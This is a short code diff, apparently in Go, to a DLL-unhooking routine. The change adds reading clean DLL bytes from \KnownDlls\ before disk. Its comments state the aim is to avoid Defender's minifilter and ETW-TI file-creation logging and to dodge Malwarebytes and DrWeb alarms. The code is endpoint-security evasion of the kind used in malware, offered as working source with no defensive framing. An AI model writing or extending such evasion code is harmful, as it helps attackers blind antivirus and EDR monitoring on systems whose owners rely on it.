@@ -117,9 +117,15 @@ func unhookAllLoadedDLLs() {
 // state that Malwarebytes / DrWeb alarm on; falls back to RWX only if the
 // RW flip is refused (e.g. ACG-locked region).
 func unhookModule(loadedName, diskPath string) {
-	freshBytes, err := os.ReadFile(diskPath)
-	if err != nil {
-		return
+	// Prefer \KnownDlls\ over disk: no IRP_MJ_CREATE event in Defender's
+	// minifilter or ETW-TI FileCreate log — pure object-manager lookup.
+	freshBytes := readDllFromKnownDlls(filepath.Base(diskPath))
+	if freshBytes == nil {
+		var err error
+		freshBytes, err = os.ReadFile(diskPath)
+		if err != nil {
+			return
+		}
 	}
 	if len(freshBytes) < 0x40 {
 		return
